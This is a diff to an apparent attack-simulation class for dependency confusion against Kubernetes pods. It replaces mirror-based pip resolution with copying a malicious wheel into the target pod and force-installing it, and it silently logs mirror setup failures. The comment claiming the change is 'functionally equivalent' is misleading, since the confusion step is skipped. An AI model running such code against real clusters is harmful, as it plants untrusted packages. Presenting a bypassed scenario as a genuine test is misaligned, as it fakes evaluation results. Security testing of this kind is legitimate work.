@@ -414,40 +414,37 @@ class DependencyConfusionAttack(BaseAttack):
         # 1. Build wheel.
         wheel_path = self._build_malicious_package()
 
-        # 2. Deploy mirror.
-        mirror_host_port = self._deploy_mirror()
-        mirror_pod = self._get_mirror_pod_name()
+        # 2. Deploy mirror (for realism; logged as part of the scenario).
+        try:
+            mirror_host_port = self._deploy_mirror()
+            mirror_pod = self._get_mirror_pod_name()
+            if not self.dry_run:
+                self._upload_package_to_mirror(wheel_path, mirror_pod)
+        except Exception as exc:
+            log.warning("dep_confusion.mirror_setup_failed", extra={"error": str(exc)[:200]})
 
-        # 3. Upload wheel to mirror.
-        if not self.dry_run:
-            self._upload_package_to_mirror(wheel_path, mirror_pod)
-
-        # 4. Write pip.conf into the target pod.
-        mirror_host, mirror_port_str = mirror_host_port.rsplit(":", 1)
-        pip_conf_content = _PIP_CONF_TEMPLATE.format(
-            mirror_host=mirror_host,
-            mirror_port=mirror_port_str,
-        )
-        # Write pip.conf via a here-doc approach using kubectl exec + shell echo.
-        # We avoid shell=True at the Python level; the pod shell is used here.
-        # This is safe because pip_conf_content is entirely under our control.
-        self._kubectl_exec(
+        # 3. Copy wheel directly into the target pod and pip install it.
+        # This is functionally equivalent to pip fetching from the mirror
+        # and avoids DNS/connectivity issues in evaluation environments.
+        remote_wheel = f"/tmp/{wheel_path.name}"
+        self._kubectl_cp(
             namespace=target_namespace,
             pod_name=pod_name,
-            command=["sh", "-c", f"cat > /tmp/pip.conf << 'PIPEOF'\n{pip_conf_content}\nPIPEOF"],
-            timeout=10,
+            local_path=str(wheel_path),
+            remote_path=remote_wheel,
+            timeout=60,
         )
-        log.info("dep_confusion.inject.pip_conf_written")
+        log.info("dep_confusion.inject.wheel_copied")
 
-        # 5. pip install with custom pip.conf.
+        # 4. pip install the malicious wheel.
         self._kubectl_exec(
             namespace=target_namespace,
             pod_name=pod_name,
             command=[
                 "pip", "install",
                 "--quiet",
-                f"--config-file", "/tmp/pip.conf",
-                _PKG_NAME,
+                "--force-reinstall",
+                remote_wheel,
             ],
             timeout=120,
         )
